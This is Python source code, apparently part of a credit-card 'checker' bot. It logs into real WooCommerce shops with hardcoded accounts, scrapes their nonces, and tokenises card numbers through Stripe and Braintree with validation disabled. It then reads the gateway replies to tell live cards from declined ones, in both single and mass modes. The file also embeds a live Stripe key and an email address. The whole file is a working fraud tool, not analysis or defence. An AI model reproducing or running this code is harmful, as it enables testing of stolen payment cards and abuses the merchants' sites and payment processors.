	data = f'type=card&billing_details[name]=+&billing_details[email]=dexterffxservices%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=832aee5d-eb81-4b59-9627-4b0e0f5da669d4c6aa&muid=ce1ff88d-2ccf-44b4-87e6-cd039fa22e9bfe0826&sid=d1996f06-22cc-4129-adc1-770bd26ded72c51435&payment_user_agent=stripe.js%2F08a843aa09%3B+stripe-js-v3%2F08a843aa09%3B+split-card-element&referrer=https%3A%2F%2Fpurpleprofessionalitalia.it&time_on_page=19633&key=pk_live_51NGkNqLqrv9VwaLxkKg6NxZWrX6UGN6mRkVNuvXXVzVepSrskeWwFwR3ExA8QOVeFCC1kBW5yQomPrJp44akaqxV00Dj7dk5cN&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoidWt6Q3JpaWRGb0VzSWtrRGppTXJnVEFYQjgvL1lWZlNOTjEzM2xkVzFhN0ZnVC83VWRHMThTcU0wR1dQRHoyWW9LdlJvTm5aWkFFSkZONFpkM3djRlF0OERQeVl6UWdnYU56S1NOcGxjNWZ6NkFNYXk4WW1NalNkUW1CZ2djQnB0TU9nT2JIV3c5L1FhdldDaCtxbHJnVnB0SDBtR3QrWXhHeWtuU1dacW1BREZmc3JLMFhOcXgyMlc3U25IcTN5YzFrS3h6UGZ1a1lvNWQvYzlXRlZxdTI1N0dkNWFJUDh2N3dtMXdPU2JtTHZJRzM2MHRqdEgwcUlPVWptM2NMUUJYWDJWd09FODVvcCtZUmtzMHVON2N2MWJ1dElJclF5ZUcwRTJJU3BuNExwSU5hRy94Ym9EaHNQVGpRSmdadXB1U2FLcVl0QS9qemJ4d2pqRWkvcStnV3N4SHFKNFV4eHBkOUxXZ29uSmVraFpYZGNNdXFtYUR4dDFodVZUaXI2SUl0dmZoTUt0blAyZWNuM0FXTzJ6N25QeHdnaHVXMWkramIvN05na3d3eDRUZlNqSW0xVnBpaTAzZEFsVUhIampGaHFMY25XcDBwZUdGeWFXZ1lNeVZxMEFMZjYwT1JubzJXb2hUWXo5M3VodDd1dGpyVjhCbUgyVGhPRlVKQ2h3SXVnVmF3amo2d0hyZHU5VmhhY3ByZml5bGpEd0NzRW1mbVQycmV1L01pN0pKdTJuTVg0aVg3Q00wdHkxanBLQmtQUjZya2tPNXZhdjhWVC9OZGxWRXFVU2NTb1hZWlB5TFcrYlVxOFBrK0tLWUVpaTRmdmZ1TkwxeVR3UG5kRlE4ZXZLRzNkUU1vckMvRGRaZDByMmtSa0ZkT1JxMzIvQkN2T01OY0YrbEM5blhBZ3lMQWhPbTN5QUdwTGE0TzIrUmVGeGxzNVFwVit0NS9rUzJJUE1ENjhwUlR5YW5ielhnNjRpSFJTSEI3ZmlkWEJISFFQZVNmVlhaZ3BHeVBHTVhVaE5EZ3cvdUpGc3pHS3NHRjFYTE1pNE5ycWVYYzkvMUZBTWh4aDZNclBYM3ZCZDlycWxYVy9EOVg0b2VHSkdneUNXVVRBZVlnQ1N5aHNmSDBzdEpvbytnRko4VDhZTmw0OW5VL2p3SGh4KzNwNU9EZk52dlVMcnpRbk02OVQzTld0aXFzbE10ZXNNS2w0VmxOWHlZTk14VCtMZWNTSXcwbjJtV3dCMVlTZ0s1NElwWEQ1VUpjTWZZYTd4elhwVENMY1BCcklsejZJbEZXM2xiTHFqSnYwRXYwYzBySzhOdnVEbkM5QmlZMFpjdkFXOGg1MHdXSTdzLzhDMjJheUNYUk5KME5vcVkzY1JodTFGVnJoVDU4LzBncGNqU0RQalF3SVJJVm4wTFN6QjZzWUJodXVBNnE5c0R6YXhkM0RyMTlPM09vOTFPMHo2WEo1VUZFVjVma2dQcEliZTRpZnJBdzlOa1o1U3FkaXpWSDhNd1RPN3NvK2szNG5xQ1dLd25nTlJSWmhlM25KNHlJZlVndHJBM3lvZEh3REU0UkRuMU1pcFBOaHo5dWdNeDRETjFrN0tyMjNvMWYzWFE4d1ZSWENmbllITXFaZEhoUEtZU0JZSlhWenB4WmF4eGFVa3BmTis4RXRPbFhISkN3WXNXdTZCL1FrNmJCMHFJVTlzSTFkS0lnZkRjUThFcDJ4Y242QnA5RGR0WThzclR6blZwOWlhZUx3TEFndVlyWEpZU3ZGUEUvak5peDltbVlEZG8rbXRhZGpFUkFiSHNkY1NtVkRuWW9oalpzekZ4U1VtNUNjR1NBV1NLbHJIL0xuNTR5ZUl4dU01akpGQmc4ZDVWUXgva0NQQUIzUWpUWnRsMDZQWDVVYUVzMHRxN1FLUmNrWkNDdHpIeSt0Q2QvS1Y1dE5ZZzJwdExpT3lObWFNNG1vZDloUFpLZjgyL1lqZUJRQUM2SHFZdG5Xb1dSeUcxS1BjcXYyZ1ZKWnVUTTEzWnpMdG4rVHllU1hSQnA5MXJsWkg1SUxmN3FsWkRPcjRsM2sxKzRkWXpWSURnN0VlN09uWHdXT09MUDVGdVVoNkhmT0JnZW8wZkRpYS9JZHlZNlB4RmNHZVFIdW1Ca3Y1S0ZsUFFOdy9pTXlnM1BzZ3hIakpsWlFZMysrelFLRzBhbWJkMm5acjIyU1JHdUxxbXlLRDNBdGtsNmhjU2t2anlhTkdhSzBKc3hyaTJMckhxYyszQWFBQjJWVWFUeXRUaGFQekNkeUdya3dZVG1NbUxwdktMdDRiNzd1SUU3anpJVFNsYS9EZW5Hd09NTUZMZEhxYllhUzFIeXVNcUNOdkRZQlBqS0JRZGFqSmp1b3gyb1ArNlhSWnpkQXk3QklBSm5tSzNIVTdGU3dRUitJTGdpS1VRWjZ1QXVpK1ZtSXlHTGxLMVJQa2Y5Zmt3d0NrWGxuRzdydE91RG1KSlRvMGlPMXpoOWFQRGJSTFN6ZXNkSmIzcjZIa3c5eTYweGNMS0lQTXRFeVdrbC9XNFNCWm5DTkQwcnd2SGV1TjJmRmxXc2QzbzczRHM1Ry9CN3JHYk80QVRabFMrVFNpNVhNb09rTHNzNWEvY3hHOWxlRnhwMVVkZGRzdktUWnhyR0FqK1pOWWN0bytPbmcyN3NqOTZvMVVCS0RNWkUxS290ZUJZZjg1c3NnSmVuWWxmMjMxTG51Q0FLR1VXU0h1Yi9pQThOMWxSb1IyRzRJdVpjTDA3ODYxdjNOWGdmMG9wVGFiZ2ovTE13UGk0eTBhdDd5YjRDc20zbjlaMG5Na1pqR0k1ckdMbWx0b3Y4YVdOck84Y2l5bU8xUkZ6clQwRHJUL0dreDFGczIvaEZRZzJjWVJGU0luelV2WEE9PSIsImV4cCI6MTczMDI5NDAxNSwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiIyNzMzMTdlMiIsInBkIjowLCJjZGF0YSI6IklML1FRUTNpUlFqM3pnQmpadkE2RXBNeFBZb2Rrc2hXc1BQL0wwTVFGc09wa2xjRVBpOEhFVGVpWU9TSGF0WWtDWUdFZ0RmdkR3aDhXcU9mTW1jUkxQd0xqbXo1K2gwMWhCZmY0QXBJK3paU2tSckNJbzgvcGZ3cW5iNEZsWFEzeHBaRkx6b0xGOUUzMW1oNm96dThzTDJIK2FvMThoK3BCVEh0YTFqbm81S2hBQ3BhZDNMckVSdWNoZjlSMkl0c1JNWHRsTHNKWmJ6TnVFanQifQ.La0fl18SzslzpEwAWrr3FfAclH2fBS_0Sde_064_Hsk'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	if not 'id' in response.json():
		print('ERORR CARD')
	else:
		id=response.json()['id']
	
	headers = {
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	response = r.post('https://purpleprofessionalitalia.it/', params=params, cookies=r.cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'success' in text:
			result = "success"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Your card was Declined."
		if 'avs' in result:
			return 'Invalid Billing Address: Avs'
		elif 'success' in result:
			return 'Nice! New payment method added.'
		elif 'Duplicate' in result:
			return 'Nice! New payment method added.'
		elif 'Insufficient Funds' in result:
			return 'Insufficient Funds'
		else:
			return result


##############B3 Single - /b3 ###########

def b3s(ccx):
    import re
    import time
    import requests
    import json
    import random
    import string
    import user_agent
    from user_agent import generate_user_agent
    from faker import Faker
    import random
    from bs4 import BeautifulSoup
    import base64

    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
    def generate_random_id(length=16):
        return ''.join(random.choice(string.hexdigits.lower()) for _ in range(length))
    
    sess = generate_random_id()
    mid = generate_random_id()
    sid = generate_random_id()
    
    def get_str(data, start, end):
        return data.split(start)[1].split(end)[0]
    	
    def get_dexter(response_text, start, end):
        return response_text.split(start)[1].split(end)[0].strip()
    
    session = requests.Session()
    user = user_agent.generate_user_agent()
    fake = Faker('en_US')
    first = fake.first_name()
    last = fake.last_name()
    street = fake.street_address()
    state = fake.state()
    postal_code = fake.postcode()
    city = fake.city()
    company = f"{first} Ltd"
    phone = "+136034" + ''.join([str(random.randint(0, 9)) for _ in range(5)])
    
    cookie_file = f'cookies/cookie_auth_{sid}.txt'
    login_url = 'https://www.sesres.com/my-account/'
    headers = {
        "User-Agent": user
    }
    login_page = session.get(login_url, headers=headers)
    login_nonce = login_page.text.split('name="woocommerce-login-nonce" value="')[1].split('"')[0]
    print(login_nonce)
    
    values = [
        "csmvbofdisfgji", "fymfdkdjhygxlr", "kslvnqtindgjfo",
        "qikvbvwdehdpwq", "yzhhibueqgulwr", "ketljekjtmrdpo"
    ]
    
    email = random.choice(values)
    print(email)
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.sesres.com',
        'Referer': 'https://www.sesres.com/my-account/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': user,
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    data = {
        'username': email,
        'password': 'Mostafa1122#',
        'woocommerce-login-nonce': login_nonce,
        '_wp_http_referer': '/my-account/',
        'login': 'Log in',
    }
    
    response2 = session.post('https://www.sesres.com/my-account/', headers=headers, data=data)
    
    headers = {
        "User-Agent": user
    }
    
    payment_page = session.get("https://www.sesres.com/my-account/add-payment-method/", headers=headers)
    client_token_nonce = payment_page.text.split('"client_token_nonce":"')[1].split('"')[0]
    anonce = get_str(payment_page.text,'name="woocommerce-add-payment-method-nonce" value="', '"').strip()
    
    headers = {
        "User-Agent": user
    }
    
    braintree_url = "https://www.sesres.com/wp-admin/admin-ajax.php"
    braintree_payload = {"action": "wc_braintree_credit_card_get_client_token", "nonce": client_token_nonce}
    braintree_response = session.post(braintree_url, headers=headers, data=braintree_payload)
    T = get_str(braintree_response.text, '"data":"', '"').strip()
    TK = base64.b64decode(T).decode('utf-8')
    au = get_str(TK, '"authorizationFingerprint":"', '"').strip()
    tokenize_url = "https://payments.braintree-api.com/graphql"
    tokenize_headers = {
        "Authorization": f"Bearer {au}",
        "Content-Type": "application/json",
        "Braintree-Version": "2018-05-10",
    }
    tokenize_payload = {
        "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": sess},
        "query": """
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        brandCode
                        last4
                        cardholderName
                        expirationMonth
                        expirationYear
                        binData {
                            prepaid
                            healthcare
                            debit
                            durbinRegulated
                            commercial
                            payroll
                            issuingBank
                            countryOfIssuance
                            productId
                        }
                    }
                }
            }
        """,
        "variables": {
            "input": {
                "creditCard": {
                    "number": n,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvc
                },
                "options": {"validate": False}
            }
        }
    }
    tokenize_response = session.post(tokenize_url, headers=tokenize_headers, json=tokenize_payload)
    r6 = tokenize_response
    token = get_dexter(r6.text, '"token":"', '"')
    brand_code = get_dexter(r6.text, '"brandCode":"', '"')
    bin_number = get_dexter(r6.text, '"bin":"', '"')
    bank_name = get_dexter(r6.text, '"issuingBank":"', '"').upper()
    
    headers = {
        'method': 'POST',
        'scheme': 'https',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': user,
    }
    
    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': brand_code,
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': token,
        'wc_braintree_device_data': '',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': anonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1'
    }
    
    response = session.post(
        'https://www.sesres.com/my-account/add-payment-method/',
        headers=headers,
        data=data
    )
    
    text = response.text
    pattern = r'Status code (.*?)</div>'
    match = re.search(pattern, text)
    if match:
        result = match.group(1)
    else:
        if 'Nice! New payment method added' in text:
            result = "Nice! New payment method added."
        elif 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
        elif 'Card Not Activated' in text:
            result = "Card Not Activated."
        elif 'Please wait for 20 seconds.' in text:
            result = "Max Request Reached Try After 25 Seconds."
        else:
            result = "Error"

    if 'avs: Gateway Rejected: avs' in result or 'Nice! New payment method added.' in result or '81724: Duplicate card exists in the vault.' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result:
        return result
    else:
        return result
        
        
#################B3 - Mass ############
def b3m(ccx):
    import re
    import time
    import requests
    import json
    import random
    import string
    import user_agent
    from user_agent import generate_user_agent
    from faker import Faker
    import random
    from bs4 import BeautifulSoup
    import base64

    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
    def generate_random_id(length=16):
        return ''.join(random.choice(string.hexdigits.lower()) for _ in range(length))
    
    sess = generate_random_id()
    mid = generate_random_id()
    sid = generate_random_id()
    
    def get_str(data, start, end):
        return data.split(start)[1].split(end)[0]
    	
    def get_dexter(response_text, start, end):
        return response_text.split(start)[1].split(end)[0].strip()
    
    session = requests.Session()
    user = user_agent.generate_user_agent()
    fake = Faker('en_US')
    first = fake.first_name()
    last = fake.last_name()
    street = fake.street_address()
    state = fake.state()
    postal_code = fake.postcode()
    city = fake.city()
    company = f"{first} Ltd"
    phone = "+136034" + ''.join([str(random.randint(0, 9)) for _ in range(5)])
    
    cookie_file = f'cookies/cookie_auth_{sid}.txt'
    login_url = 'https://www.sesres.com/my-account/'
    headers = {
        "User-Agent": user
    }
    login_page = session.get(login_url, headers=headers)
    login_nonce = login_page.text.split('name="woocommerce-login-nonce" value="')[1].split('"')[0]
    print(login_nonce)
    
    values = [
        "csmvbofdisfgji", "fymfdkdjhygxlr", "kslvnqtindgjfo",
        "qikvbvwdehdpwq", "yzhhibueqgulwr", "ketljekjtmrdpo"
    ]
    
    email = random.choice(values)
    print(email)
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.sesres.com',
        'Referer': 'https://www.sesres.com/my-account/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': user,
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    data = {
        'username': email,
        'password': 'Mostafa1122#',
        'woocommerce-login-nonce': login_nonce,
        '_wp_http_referer': '/my-account/',
        'login': 'Log in',
    }
    
    response2 = session.post('https://www.sesres.com/my-account/', headers=headers, data=data)
    
    headers = {
        "User-Agent": user
    }
    
    payment_page = session.get("https://www.sesres.com/my-account/add-payment-method/", headers=headers)
    client_token_nonce = payment_page.text.split('"client_token_nonce":"')[1].split('"')[0]
    anonce = get_str(payment_page.text,'name="woocommerce-add-payment-method-nonce" value="', '"').strip()
    
    headers = {
        "User-Agent": user
    }
    
    braintree_url = "https://www.sesres.com/wp-admin/admin-ajax.php"
    braintree_payload = {"action": "wc_braintree_credit_card_get_client_token", "nonce": client_token_nonce}
    braintree_response = session.post(braintree_url, headers=headers, data=braintree_payload)
    T = get_str(braintree_response.text, '"data":"', '"').strip()
    TK = base64.b64decode(T).decode('utf-8')
    au = get_str(TK, '"authorizationFingerprint":"', '"').strip()
    tokenize_url = "https://payments.braintree-api.com/graphql"
    tokenize_headers = {
        "Authorization": f"Bearer {au}",
        "Content-Type": "application/json",
        "Braintree-Version": "2018-05-10",
    }
    tokenize_payload = {
        "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": sess},
        "query": """
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin
                        brandCode
                        last4
                        cardholderName
                        expirationMonth
                        expirationYear
                        binData {
                            prepaid
                            healthcare
                            debit
                            durbinRegulated
                            commercial
                            payroll
                            issuingBank
                            countryOfIssuance
                            productId
                        }
                    }
                }
            }
        """,
        "variables": {
            "input": {
                "creditCard": {
                    "number": n,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvc
                },
                "options": {"validate": False}
            }
        }
    }
    tokenize_response = session.post(tokenize_url, headers=tokenize_headers, json=tokenize_payload)
    r6 = tokenize_response
    token = get_dexter(r6.text, '"token":"', '"')
    brand_code = get_dexter(r6.text, '"brandCode":"', '"')
    bin_number = get_dexter(r6.text, '"bin":"', '"')
    bank_name = get_dexter(r6.text, '"issuingBank":"', '"').upper()
    
    headers = {
        'method': 'POST',
        'scheme': 'https',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': user,
    }
    
    data = {
        'payment_method': 'braintree_credit_card',
        'wc-braintree-credit-card-card-type': brand_code,
        'wc-braintree-credit-card-3d-secure-enabled': '',
        'wc-braintree-credit-card-3d-secure-verified': '',
        'wc-braintree-credit-card-3d-secure-order-total': '0.00',
        'wc_braintree_credit_card_payment_nonce': token,
        'wc_braintree_device_data': '',
        'wc-braintree-credit-card-tokenize-payment-method': 'true',
        'woocommerce-add-payment-method-nonce': anonce,
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1'
    }
    
    response = session.post(
        'https://www.sesres.com/my-account/add-payment-method/',
        headers=headers,
        data=data
    )
    
    text = response.text
    pattern = r'Status code (.*?)</div>'
    match = re.search(pattern, text)
    if match:
        result = match.group(1)
    else:
        if 'Nice! New payment method added' in text:
            result = "Nice! New payment method added."
        elif 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
        elif 'Card Not Activated' in text:
            result = "Card Not Activated."
        elif 'Please wait for 20 seconds.' in text:
            result = "Max Request Reached Try After 25 Seconds."
        else:
            result = "Error"

    if 'avs: Gateway Rejected: avs' in result or 'Nice! New payment method added.' in result or '81724: Duplicate card exists in the vault.' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result:
        return result
    else:
        return result
